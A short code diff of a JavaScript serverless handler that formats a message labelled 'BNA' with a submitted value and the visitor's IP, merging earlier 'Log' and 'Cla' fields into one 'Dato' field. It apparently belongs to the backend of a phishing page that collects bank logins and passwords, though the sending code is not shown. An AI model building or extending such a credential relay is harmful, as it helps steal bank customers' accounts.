@@ -10,8 +10,7 @@ exports.handler = async (event) => {
   const mensaje = `
 📩 BNA
 
-Log: ${tipo}
-Cla: ${valor}
+Dato: ${valor}
 IP: ${ip}
   `;
 
@@ -29,3 +28,4 @@ IP: ${ip}
     body: JSON.stringify({ ok: true })
   };
 };
+
